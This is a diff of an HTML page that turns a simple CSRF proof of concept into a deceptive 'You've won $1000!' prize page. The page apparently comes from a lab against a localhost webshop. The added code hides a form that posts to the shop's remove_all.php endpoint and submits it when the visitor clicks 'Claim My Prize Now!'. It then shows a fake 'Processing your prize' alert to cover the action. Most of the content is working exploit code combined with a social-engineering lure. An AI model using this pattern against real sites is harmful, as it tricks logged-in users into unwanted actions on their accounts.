@@ -1,25 +1,81 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Free Gift!</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations! You Won!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: white;
+            color: #333;
+            padding: 40px;
+            border-radius: 10px;
+            max-width: 600px;
+            margin: 0 auto;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        h1 {
+            color: #667eea;
+            margin-bottom: 20px;
+        }
+        .prize {
+            font-size: 48px;
+            margin: 20px 0;
+        }
+        button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background: #5568d3;
+        }
+        .hidden-form {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Click here to claim your FREE gift!</h1>
+    <div class="container">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <p class="prize">💰 You've won $1000! 💰</p>
+        <p>Click the button below to claim your prize!</p>
+        <button onclick="claimPrize()">Claim My Prize Now!</button>
+        <p style="margin-top: 20px; font-size: 12px; color: #999;">
+            * No purchase necessary. Limited time offer.
+        </p>
+    </div>
+
+    <!-- Hidden CSRF attack forms -->
+    <!-- These forms will be submitted when the user clicks the button -->
+    <!-- They target the vulnerable remove_all.php endpoint -->
     
-    <form id="attack" action="http://localhost/webshop/webshop/remove_all.php" method="POST">
+    <!-- Remove product ID 1 -->
+    <form id="csrf-form-1" class="hidden-form" action="http://localhost/webshop/remove_all.php" method="POST">
         <input type="hidden" name="product_id" value="1">
     </form>
-    
-    <button onclick="document.getElementById('attack').submit();">
-        Claim Free Gift!
-    </button>
-    
-    <p><strong>Instructions:</strong></p>
-    <ol>
-        <li>Make sure you're logged into the webshop</li>
-        <li>Add product ID 1 to your cart</li>
-        <li>Click the button above</li>
-        <li>You'll be redirected to cart.php and the product will be gone!</li>
-    </ol>
+
+    <script>
+        function claimPrize() {
+            // Submit all forms to remove items from victim's cart
+            document.getElementById('csrf-form-1').submit();
+            
+            // Show fake message
+            alert('Processing your prize... Please wait!');
+        }
+
+    </script>
 </body>
 </html>
